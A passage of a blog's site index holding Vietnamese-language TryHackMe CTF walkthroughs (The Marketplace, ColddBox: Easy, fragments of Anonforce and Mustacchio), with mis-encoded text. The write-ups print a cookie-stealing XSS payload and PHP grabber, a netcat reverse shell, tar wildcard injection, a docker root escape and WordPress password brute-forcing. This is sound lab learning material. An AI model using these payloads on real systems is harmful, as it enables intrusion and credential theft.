1790c/s 1790C/s vampiro..arenita Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Váº­y lÃ  tÃ´i cÃ³ passowrd cá»§a user root. Thá»­ login vá»›i SSH\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh root@10.10.219.60 The authenticity of host \u0026#39;10.10.219.60 (10.10.219.60)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.219.60\u0026#39; (ED25519) to the list of known hosts. root@10.10.219.60\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. root@ubuntu:~# id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:~# ls root.txt root@ubuntu:~# HoÃ n thÃ nh!\n","date":"3 February 2022","externalUrl":null,"permalink":"/ctf/tryhackme/anonforce/","section":"Ctf","summary":"","title":"Tryhackme - Anonforce","type":"ctf"},{"content":"","date":"1 February 2022","externalUrl":null,"permalink":"/tags/sqli/","section":"Tags","summary":"","title":"Sqli","type":"tags"},{"content":"The holidays are too long, so I can only return to CTF now. And today I will open the New Year bowl with a machine medium - Tryhackme - The Marketplace\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn machine nÃ y.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1 | 256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE= | 256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar 80/tcp open http syn-ack nginx 1.19.2 |_http-title: The Marketplace | http-robots.txt: 1 disallowed entry |_/admin | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.19.2 32768/tcp open http syn-ack Node.js (Express middleware) | http-robots.txt: 1 disallowed entry |_/admin |_http-title: The Marketplace | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Sau 1 lÃºc xem qua 2 port vá»›i http web server, tÃ´i táº¡m thá»i chÆ°a tÃ¬m Ä‘Æ°á»£c gÃ¬ Ä‘áº·c biá»‡t, váº­y nÃªn tÃ´i sáº½ tÃ¬m web path vá»›i dirsearch\nSau khi quÃ©t web path vá»›i cáº£ 2 port káº¿t há»£p vá»›i pháº§n thu tháº­p thÃ´ng tin á»Ÿ trÃªn, tÃ´i cÃ³ 1 vÃ i ghi chÃº:\n/login lÃ  trang Ä‘Äƒng nháº­p /signup Ä‘Ã¹ng Ä‘á»ƒ Ä‘Äƒng kÃ½ tÃ i khoáº£n má»›i, vÃ  khÃ´ng kiá»ƒm tra trÃ¹ng tÃªn user /new táº¡o listing má»›i /item/1 cÃ¡c bÃ i viáº¿t Ä‘Æ°á»£c Ä‘Ã¡nh sá»‘ 1,2,3,4,\u0026hellip;. Khi chá»n item nÃ o path sáº½ trá» vá» sá»‘ thá»© tá»± cá»§a item Ä‘Ã³ /message xem tin nháº¯n cá»§a user. Sau khi thá»±c hiá»‡n report thÃ¬ admin sáº½ tráº£ lá»i vÃ  tÃ´i cÃ³ thá»ƒ xem tráº£ lá»i cá»§a admin á»Ÿ trong nÃ y /contact xem cÃ¡c liÃªn há»‡. /contact/michael nghÄ©a lÃ  xem liÃªn há»‡ cá»§a michael /report/1 bÃ¡o cÃ¡o cÃ¡c bÃ i viáº¿t theo sá»‘ thá»© tá»± item phÃ­a trÃªn /admin cháº¯c lÃ  path cá»§a quáº£n trá»‹ viÃªn Váº­y nÃªn tÃ´i thá»­ dÃ¹ng BurpSuite Ä‘á»ƒ xem khai cÃ³ thÃ¡c Ä‘Æ°á»£c gÃ¬ tá»« cÃ¡c path phÃ­a trÃªn khÃ´ng. Vá»›i pháº§n /report, request cho tÃ´i 1 cookie\nVá»›i cookie, tÃ´i thá»­ vÃ o JWT Ä‘á»ƒ decode\nTÃ´i Ä‘Ã£ thá»­ vÃ i cÃ¡c Ä‘á»ƒ giáº£ máº¡o cookie nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£. Táº¡m thá»i note nÃ³ láº¡i, tÃ´i sáº½ chuyá»ƒn qua cÃ¡ch khÃ¡c. Trong /new, vá»›i nhá»¯ng pháº§n cÃ³ thá»ƒ nháº­p vÃ o tá»« bÃ n phÃ­m nhÆ° tháº¿ nÃ y, tÃ´i thá»­ vÃ i xss Ä‘Æ¡n giáº£n\nVáº­y lÃ  tÃ´i cÃ³ lá»— há»•ng XSS á»Ÿ Ä‘Ã¢y. TÃ´i sáº½ thá»­ láº¥y cookie cá»§a admin báº±ng cÃ¡ch táº¡o 1 listing chá»©a XXS payload vÃ  bÃ¡o cÃ¡o nÃ³ vá»›i quáº£n trá»‹ viÃªn.\nÄá»c thÃªm: Data grabber for XSS\nÄáº§u tiÃªn táº¡o file grapper.php\n\u0026lt;?php $cookie = $_GET[\u0026#39;c\u0026#39;]; $fp = fopen(\u0026#39;cookies.txt\u0026#39;, \u0026#39;a+\u0026#39;); fwrite($fp, \u0026#39;Cookie:\u0026#39; .$cookie.\u0026#34;\\r\\n\u0026#34;); fclose($fp); ?\u0026gt; Táº¡o XSS payload\n\u0026lt;script\u0026gt;document.location='http://IP-remote:port-remote/grabber.php?c='+document.cookie\u0026lt;/script\u0026gt;\nTrÆ°á»›c khi áº¥n \u0026ldquo;Summit Query\u0026rdquo; thÃ¬ táº¡o listener vá»›i port 9001\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.18.3.74] from (UNKNOWN) [10.18.3.74] 57770 GET /grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTY2MTY3MTUyNX0.8txB8EpTpBDTcHhL-_LzZe4n7zC3exATeCBm_m49tyw HTTP/1.1 Host: 10.18.3.74:9001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://10.10.31.207/ Upgrade-Insecure-Requests: 1 Sau Ä‘Ã³ report listing nÃ y vá»›i quáº£n trá»‹ viÃªn Ä‘á»ƒ há» tráº£ lá»i vÃ  tÃ´i sáº½ cÃ³ Ä‘Æ°á»£c cookie cá»§a há»\nTiáº¿p theo tÃ´i vÃ o path /admin Ä‘á»ƒ thay Ä‘á»•i cookie vá»›i BurpSuite\nVáº­y lÃ  tÃ´i cÃ³ flag 1.\nTiáº¿p theo, tÃ´i Ä‘á»ƒ Ã½ vá»›i response nÃ y, tÃ´i cÃ³ ID cá»§a tá»«ng user, váº­y nÃªn tÃ´i Ä‘Ã£ nghÄ© ráº±ng sao khÃ´ng thá»­ vÃ i SQLi vá»›i path /admin vÃ  in ra tÃªn cá»§a database\nSau 1 lÃºc tÃ¬m hiá»ƒu vá» SQLi tÃ´i nháº­n ra khi query Ä‘áº¿n database, ID nÃ o Ä‘Ã£ tá»“n táº¡i thÃ¬ nÃ³ sáº½ in ra thÃ´ng tin vá» ID Ä‘Ã³ vÃ  tháº¿ lÃ  háº¿t. Váº­y Ä‘á»ƒ database query Ä‘Æ°á»£c cÃ¢u lá»‡nh SQLi phÃ­a sau, tÃ´i pháº£i thÃªm vÃ o 1 ID chÆ°a cÃ³ trong db, á»Ÿ Ä‘Ã¢y tÃ´i Ä‘Ã£ cÃ³ ID 1,2,3,4, váº­y thÃ¬ ID chÆ°a Ä‘Æ°á»£c gÃ¡n thÃ´ng tin sáº½ lÃ  5\nÄá»c thÃªm: SQLi\nVáº­y lÃ  tÃ´i cÃ³ db Ä‘ang sá»­ dá»¥ng lÃ  \u0026lsquo;marketplace\u0026rsquo;. Tiáº¿p tá»¥c show cÃ¡c tables cÃ³ trong db nÃ y\nTÃ´i cÃ³ 3 tables á»Ÿ Ä‘Ã¢y: items, messages vÃ  users. Query Ä‘áº¿n table user Ä‘á»ƒ láº¥y thÃ´ng tin vá» cÃ¡c users\nVáº­y lÃ  tÃ´i cÃ³ 3 username vÃ  password, lÆ°u nÃ³ láº¡i. Tiáº¿p theo tÃ´i cÃ²n 1 table ná»¯a chÆ°a xem thá»­ Ä‘Ã³ lÃ  \u0026lsquo;message\u0026rsquo;\nVáº­y lÃ  tÃ´i cÃ³ password cá»§a 1 user. Thá»­ ssh vá»›i 2 user Ä‘Ã£ biáº¿t lÃ  jake vÃ  michael\nSSH # â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh jake@10.10.37.209 The authenticity of host \u0026#39;10.10.37.209 (10.10.37.209)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:Rl4+lAmQWEhSKHNbPY/BoNdG16/4xcmIXNIlSrBasm0. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.37.209\u0026#39; (ED25519) to the list of known hosts. jake@10.10.37.209\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Aug 28 09:32:13 UTC 2022 System load: 0.0 Users logged in: 0 Usage of /: 87.1% of 14.70GB IP address for eth0: 10.10.37.209 Memory usage: 31% IP address for docker0: 172.17.0.1 Swap usage: 0% IP address for br-636b40a4e2d6: 172.18.0.1 Processes: 102 =\u0026gt; / is using 87.1% of 14.70GB 20 packages can be updated. 0 updates are security updates. jake@the-marketplace:~$ ls user.txt jake@the-marketplace:~$ Privilege escalation # sudo -l\njake@the-marketplace:~$ sudo -l Matching Defaults entries for jake on the-marketplace: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jake may run the following commands on the-marketplace: (michael) NOPASSWD: /opt/backups/backup.sh jake@the-marketplace:~$ cat /opt/backups/backup.sh #!/bin/bash echo \u0026#34;Backing up files...\u0026#34;; tar cf /opt/backups/backup.tar * Äiá»u nÃ y cÃ³ nghÄ©a lÃ  tÃ´i cÃ³ thá»ƒ thÃªm payload vÃ o file backup.sh Ä‘á»ƒ khi cháº¡y file nÃ y, payload sáº½ gá»i Ä‘áº¿n user michael. ThÃªm 1 Ä‘iá»u ná»¯a, khi cháº¡y file backup.sh, nÃ³ sáº½ sinh ra 1 file tar. TÃ´i cÃ³ nhá»› cÃ³ 1 exploit vá»›i tar, nÃ³ á»Ÿ Ä‘Ã¢y\nÄáº§u tiÃªn váº«n pháº£i táº¡o file shell má»›i chá»©a payload, sau Ä‘Ã³ sáº½ dÃ¹ng exploit vá»›i tar. Sau Ä‘Ã³ táº¡o listener vá»›i port 9001: nc -lnvp 9001\nVÃ  nÃ³ sáº½ giá»‘ng nhÆ° tháº¿ nÃ y\njake@the-marketplace:/opt/backups$ echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt; shell.sh jake@the-marketplace:/opt/backups$ echo \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.18.3.74 9001 \u0026gt;/tmp/f\u0026#39; \u0026gt; shell.sh jake@the-marketplace:/opt/backups$ chmod +x shell.sh jake@the-marketplace:/opt/backups$ touch \u0026#39;/opt/backups/--checkpoint=1\u0026#39; jake@the-marketplace:/opt/backups$ touch \u0026#39;/opt/backups/--checkpoint-action=exec=sh shell.sh\u0026#39; jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh Backing up files... rm: cannot remove \u0026#39;/tmp/f\u0026#39;: No such file or directory Sang phÃ­a listener\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.171.7] 40864 michael@the-marketplace:/opt/backups$ michael@the-marketplace:/opt/backups$ cd michael@the-marketplace:~$ cd /home/michael/ michael@the-marketplace:/home/michael$ id uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker) User michael cÃ³ trong group docker. TÃ´i sáº½ thá»­ vÃ o GTFOBins xem cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i docker. Vá»›i group docker tÃ´i sáº½ sá»­ dá»¥ng SUID\nmichael@the-marketplace:~$ /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh # id uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) # ls /root/ root.txt # HoÃ n thÃ nh!\n","date":"1 February 2022","externalUrl":null,"permalink":"/ctf/tryhackme/the-marketplace/","section":"Ctf","summary":"","title":"Tryhackme - The Marketplace","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - ColddBox: Easy\nReconnaissance # NhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-generator: WordPress 4.1.31 |_http-title: ColddBox | One more machine | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 4512/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB | 256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8= | 256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Äi qua web trÆ°á»›c. Web Ä‘Æ°á»£c build bá»Ÿi Wordpress 4.1.31, thá»­ tÃ¬m xem cÃ³ exploit nÃ o vá»›i phiÃªn báº£n nÃ y khÃ´ng\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ searchsploit wordpress 4.1.31 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- WordPress Core \u0026lt; 4.7.1 - Username Enumeration | php/webapps/41497.php WordPress Core \u0026lt; 4.7.4 - Unauthorized Password Reset | linux/webapps/41963.txt WordPress Core \u0026lt; 4.9.6 - (Authenticated) Arbitrary File Deletion | php/webapps/44949.txt WordPress Core \u0026lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md WordPress Core \u0026lt; 5.3.x - \u0026#39;xmlrpc.php\u0026#39; Denial of Service | php/dos/47800.py WordPress Plugin Database Backup \u0026lt; 5.2 - Remote Code Execution (Metasploit) | php/remote/47187.rb WordPress Plugin DZS Videogallery \u0026lt; 8.60 - Multiple Vulnerabilities | php/webapps/39553.txt WordPress Plugin EZ SQL Reports \u0026lt; 4.11.37 - Multiple Vulnerabilities | php/webapps/38176.txt WordPress Plugin iThemes Security \u0026lt; 7.0.3 - SQL Injection | php/webapps/44943.txt WordPress Plugin Rest Google Maps \u0026lt; 7.11.18 - SQL Injection | php/webapps/48918.sh WordPress Plugin User Role Editor \u0026lt; 4.25 - Privilege Escalation | php/webapps/44595.rb WordPress Plugin Userpro \u0026lt; 4.9.17.1 - Authentication Bypass | php/webapps/43117.txt WordPress Plugin UserPro \u0026lt; 4.9.21 - User Registration Privilege Escalation | php/webapps/46083.txt ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results CÃ³ 1 exploit RCE vá»›i Metaploit, tÃ´i sáº½ thá»­ vá»›i nÃ³ trÆ°á»›c. NhÆ°ng nÃ³ Ä‘Ã²i há»i pháº£i cÃ³ username vÃ  password nÃªn táº¡m thá»i tÃ´i sáº½ Ä‘á»ƒ note nÃ³ láº¡i.\nQuay láº¡i vá»›i tool tháº§n thÃ¡nh WPScan\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wpscan --url http://10.10.229.157 -e vp,u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]y [i] Updating the Database ... [i] Update completed. [+] URL: http://10.10.229.157/ [10.10.229.157] [+] Started: Thu Aug 25 03:04:55 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.229.157/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.229.157/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.229.157/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://10.10.229.157/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.1.31\u0026lt;/generator\u0026gt; | - http://10.10.229.157/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.1.31\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyfifteen | Location: http://10.10.229.157/wp-content/themes/twentyfifteen/ | Last Updated: 2022-05-24T00:00:00.000Z | Readme: http://10.10.229.157/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://10.10.229.157/wp-content/themes/twentyfifteen/style.css?ver=4.1.31 | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen\u0026#39;s simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.229.157/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: \u0026#39;Version: 1.0\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 \u0026lt;===============================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:02 [i] User(s) Identified: [+] the cold in person | Found By: Rss Generator (Passive Detection) [+] c0ldd | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] philip | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] hugo | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register á» Ä‘Ã¢y tÃ´i cÃ³ Ä‘Æ°á»£c vÃ i thá»© hay ho\nFile xmlrpc.php cÃ³ thá»ƒ khai thÃ¡c Theme Ä‘ang sá»­ dá»¥ng lÃ  twentyfifteen vá»›i phiÃªn báº£n cÅ© TÃ¬m Ä‘Æ°á»£c 4 username Ä‘á»ƒ cÃ³ thá»ƒ brute-force TÃ´i sáº½ thá»­ phÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n nháº¥t trÆ°á»›c tiÃªn, Ä‘Ã³ lÃ  brute-force username\n[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:38 \u0026lt;==============================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:38 [i] No Config Backups Found. [+] Performing password attack on Wp Login against 1 user/s [SUCCESS] - c0ldd / 9876543210 Trying c0ldd / pink123 Time: 00:02:10 \u0026lt;== \u0026gt; (1225 / 43885) 2.79% ETA: ??:??:?? [!] Valid Combinations Found: | Username: c0ldd, Password: ************ Thá»­ Ä‘Äƒng nháº­p vÃ o Wordpress vÃ  tÃ´i nháº­n ra Ä‘Ã¢y lÃ  user admin. VÃ o plugin editor Ä‘á»ƒ thá»­ upload reverse shell\nRCE # Sau khi \u0026ldquo;Update File\u0026rdquo; thÃ¬ táº¡o listener vá»›i port 9001. Truy cáº­p vÃ o 404.php Ä‘á»ƒ láº¥y RCE:\nhttp://10.10.229.157/wp-content/themes/twentyfifteen/404.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.229.157] 47378 Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 09:33:17 up 49 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1341): Inappropriate ioctl for device bash: no job control in this shell www-data@ColddBox-Easy:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@ColddBox-Easy:/$ Vá»›i 1 machine cÃ³ Wordpress, sau khi cÃ³ RCE tÃ´i thÆ°á»ng truy vÃ o xem ná»™i dung wp-config.php vÃ¬ thÆ°á»ng nÃ³ sáº½ chá»©a username vÃ  password cá»§a database.\nwww-data@ColddBox-Easy:/var/www/html$ cat wp-config.php \u0026lt;?php /** * The base configurations of the WordPress. * * This file has the following configurations: MySQL settings, Table Prefix, * Secret Keys, and ABSPATH. You can find more information by visiting * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php} * Codex page. You can get the MySQL settings from your web host. * * This file is used by the wp-config.php creation script during the * installation. You don\u0026#39;t have to use the web site, you can just copy this file * to \u0026#34;wp-config.php\u0026#34; and fill in the values. * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;colddbox\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;c0ldd\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;**************\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); ThÆ°á»ng thÃ¬ trong cÃ¡c machine trÆ°á»›c tÃ´i tháº¥y password database cÅ©ng sáº½ lÃ  password cá»§a user Ä‘Ã³, nÃªn tÃ´i cÅ©ng sáº½ thá»­ password nÃ y vá»›i user c0ldd\nwww-data@ColddBox-Easy:/$ su c0ldd Password: c0ldd@ColddBox-Easy:/$ id uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) c0ldd@ColddBox-Easy:/$ cd /home/c0ldd c0ldd@ColddBox-Easy:~$ ls user.txt c0ldd@ColddBox-Easy:~$ Tháº­t lÃ  1 sá»± tháº§n ká»³ \u0026#x1f60f; TÃ´i tÃ¬m Ä‘Æ°á»£c user flag.\nPrivilege escalation # sudo -l\nc0ldd@ColddBox-Easy:~$ sudo -l Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy: (root) /usr/bin/vim (root) /bin/chmod (root) /usr/bin/ftp c0ldd@ColddBox-Easy:~$ VÃ o GTFOBins Ä‘á»ƒ tÃ¬m leo thang Ä‘áº·c quyá»n vá»›i vim\nThá»­ vá»›i command Ä‘áº§u tiÃªn\nc0ldd@ColddBox-Easy:~$ sudo vim -c \u0026#39;:!/bin/sh\u0026#39; # ^[[2;2R /bin/sh: 1: not found /bin/sh: 1: 2R: not found # id uid=0(root) gid=0(root) grupos=0(root) # HoÃ n thÃ nh! Má»™t machine khÃ´ng quÃ¡ khÃ³, phÃ¹ há»£p Ä‘á»ƒ báº¯t Ä‘áº§u cho ngÆ°á»i má»›i.\n","date":"31 December 2021","externalUrl":null,"permalink":"/ctf/tryhackme/colddbox-easy/","section":"Ctf","summary":"","title":"Tryhackme - ColddBox: Easy","type":"ctf"},{"content":"HÃ´m nay tÃ´i quyáº¿t Ä‘á»‹nh lÃ m thÃªm 1 machine dá»… ná»¯a: Tryhackme - Mustacchio\nReconnaissance # Viá»‡c Ä‘áº§u tiÃªn, táº¥t nhiÃªn rá»“i, quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 